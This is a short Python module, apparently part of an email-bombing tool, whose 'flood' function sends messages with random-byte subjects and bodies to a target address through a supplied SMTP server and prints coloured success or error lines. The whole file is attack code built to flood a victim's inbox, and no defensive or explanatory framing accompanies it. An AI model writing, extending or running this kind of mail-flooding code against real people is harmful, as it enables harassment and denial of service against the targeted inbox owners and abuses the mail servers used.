# Import modules
from colorama import Fore
from random import _urandom, randint

# Generate random data
def __rand():
    size = randint(10, 90)
    data = str(_urandom(size))
    return data[:-1][2:]


def flood(target):
    server, username, subject, body, target = target
    # Generate random data
    if not subject:
        subject = __rand()
    if not body:
        body = __rand()
    # Message
    msg = f"From: {username}\nSubject: {subject}\n{body}"
    # Send email
    try:
        server.sendmail(username, target, msg.encode("utf-8"))
    except Exception as err:
        print(
            f"{Fore.MAGENTA}Error while sending mail\n{Fore.MAGENTA}{err}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Mail sent to {target}.{Fore.RESET}"
        )
